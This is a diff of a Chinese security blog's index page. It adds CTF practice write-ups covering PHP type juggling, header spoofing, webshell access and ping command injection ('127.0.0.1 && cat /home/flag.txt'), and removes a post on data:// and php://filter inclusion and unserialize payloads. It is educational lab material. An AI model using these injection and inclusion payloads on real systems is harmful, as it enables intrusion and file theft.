@@ -277,6 +277,78 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-web" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/03/13/web/" class="article-date">
+      <time datetime="2021-03-13T07:59:05.000Z" itemprop="datePublished">2021-03-13</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/03/13/web/">攻防世界练习</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1>simp_php</h1>
+
+<p>题目如下：<br><img src="/2021/03/13/web/q1.png"><br>根据题目可知，flag1==0且a不为0；想得到flag2，b不为数字或字符串，is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>最终<br>payload:?a=0a&amp;b=123456%00;<br><img src="/2021/03/13/web/q2.png"><br>得到flag！</p>
+<h1>Get Post</h1>
+
+<p>题目：<br><img src="/2021/03/13/web/a1.png"><br>根据提示，get传入?a=1<br>在根据提示post传入b=2<br><img src="/2021/03/13/web/a2.png"><br>euuuu好简单，是我的打开方式不对/??</p>
+<h1>xff_referer</h1>
+
+<p>题目显示ip地址必须为123.123.123<br>采用bp抓包：<br>X-Forwarded-For: 123.123.123.123<br>提示说必须来自<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>得到flag！</p>
+<h1>webshell</h1>
+
+<p>打开题目，一句话木马，才一年采用蚁剑<br><img src="/2021/03/13/web/11.png"><br>点击添加的地址，进入之后<br><img src="/2021/03/13/web/222.png"><br>得到flag！</p>
+<h1>command_execution</h1>
+
+<p>打开题目：<br><img src="/2021/03/13/web/p1.png"><br>ping!!<br>连接本机127.0.0.1<br><img src="/2021/03/13/web/p2.png"><br>成功回显，试试其他命令127.0.0.1 &amp;&amp; ls<br>可以执行，那么我们直接<br><img src="/2021/03/13/web/1.png"><br>127.0.0.1 &amp;&amp; cat /home/flag.txt<br><img src="/2021/03/13/web/2.png"><br>得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-fan" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1146,130 +1218,6 @@ HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#
 <h2>菜鸡求学之路</h2> 
 
 <p>看大佬的payload的时候，很疑惑为什么要写%00Name%00username这样的形式？<br>进行了三种修饰方式的测试:public,protected,private<br>只有public修饰的不用太多的修饰原生态构造就好，而private需要加%00Name%00，<br>protected则需要使用 %00*%00username这样的方式<br>——————<br><b>protected修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip8.png"><br><b>public修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip9.png"><br><b>private修饰变量，运行后回显代码内注释内容</b><br><img src="/2021/02/07/zip/zip10.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-nizhuansiwei" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/02/05/nizhuansiwei/" class="article-date">
-      <time datetime="2021-02-05T05:26:32.000Z" itemprop="datePublished">2021-02-05</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/02/05/nizhuansiwei/">19-buu练习[ZJCTF 2019]NiZhuanSiWei</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开靶场，给出一段代码：<br><img src="/2021/02/05/nizhuansiwei/a1.png"><br><b style="color:pink">代码注释如下：</b><br>    &lt;?php<br>    $text = $_GET[“text”];<br>    $file = $_GET[“file”];<br>    $password = $_GET[“password”];<br>    if(isset($text)&amp;&amp;(file_get_contents($text,’r’)===”welcome to the zjctf”)){<br>    //判断$text变量是否存在并判断”welcome to the zjctf”是否被写入</p>
-<pre><code>echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
-//如果满足条件输出写入的内容
-
-if(preg_match(&quot;/flag/&quot;,$file))&#123;  //不给你看flag
-    echo &quot;Not now!&quot;;
-    exit(); 
-&#125;else&#123;
-    include($file);  //useless.php (题目源码注释)
-
-//文件包含，已经提示要我们查看userless.php 
-    $password = unserialize($password);    //反序列化$password
-    echo $password;
-&#125;
-&#125;
-else&#123;
-highlight_file(__FILE__);
-&#125;
-?&gt;</code></pre>
-<p><b style="color:pink">知识点：</b><br>1.data伪协议写入文件<br>data:// 协议</p>
-<p style="color:yellow">条件：</p>
-
-<p>allow_url_fopen:on<br>allow_url_include :on</p>
-<p style="color:yellow">作用：</p>
-
-<p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
-<p style="color:yellow">用法：</p>
-
-<p>data://text/plain,<br>data://text/plain;base64,</p>
-<p style="color:yellow">示例：</p>
-
-<p>1##data://text/plain,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain">http://127.0.0.1/include.php?file=data://text/plain</a>,<?php%20phpinfo();?><br><img src="/2021/02/05/nizhuansiwei/a5.png"><br>2##data://text/plain;base64,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a><br><img src="/2021/02/05/nizhuansiwei/a6.png"><br>2.php://（具体内容前面有所涉及）</p>
-<ul>
-<li>php://filter用于读取源码
-</li><li>php://input用于执行php代码
-</li></ul>
-
-<p>3.php反序列化漏洞，详细内容参见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ichunqiu/p/10484832.html">https://www.cnblogs.com/ichunqiu/p/10484832.html</a><br><b style="color:pink">解题步骤：</b><br><b style="color:blue">##第一个绕过：</b></p>
-<ul>
-<li>if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf"))
-</li></ul>
-
-<p>这一行代码进行一个绕过。因为我们不知道后台哪个文件的源码是welcome to the zjctf，说不准就真没有，只能在传入的时候直接带进来。这里利用到data伪协议将数据直接写进去，以供file_get_contents函数读取。</p>
-<ul>
-<li>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=
-</li></ul>
-
-<p><b style="color:blue">##第二个绕过：</b><br>if(preg_match(“/flag/“,$file)){     #上传的file变量中不能包含’flag’字样<br>        echo “Not now!”;<br>        exit();<br>    }else{<br>        include($file);  //useless.php<br>        $password = unserialize($password);<br>        echo $password;<br>    }<br>这里源码给你提示了，让你包含useless.php，如果包含flag.php直接报错。<br>于是</p>
-<ul>
-<li>file=useless.php
-</li></ul>
-
-<p>如果直接这么执行的话，返回的文件中包含的php代码会直接当成php命令来执行，所以需要base64编码一下，以免被执行。</p>
-<ul>
-<li>file=php://filter/read=convert.base64-encode/resource=useless.php
-</li></ul>
-
-<p>这里利用php”//filter来读取源码:<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php<br><img src="/2021/02/05/nizhuansiwei/a2.png"><br>base64解码：<br><img src="/2021/02/05/nizhuansiwei/a3.png"><br><b style="color:blue">##第三个绕过：</b><br>$password = $_GET[“password”];<br>include($file);  //useless.php<br>$password = unserialize($password);<br>echo $password;</p>
-<p style="color:yellow">这里的file是我们可控的，所以在本地测试后有执行下面代码即可出现payload：</p>
-
-<p>  &lt;？php<br> class Flag{  //flag.php<br>    public $file=”flag.php”;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “《br》”;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>$a = new Flag();<br>echo serialize($a);<br>?&gt;<br>//O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
-<p style="color:yellow">最后payload：</p>
-<ul>
-<li>http://6619a3b1-daa6-4ab9-bb3d-ba8b90593516.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D
-</li></ul>
-
-<p>查看源代码，flag在源代码中：<br><img src="/2021/02/05/nizhuansiwei/a4.png"></p>
 
       
     </div>
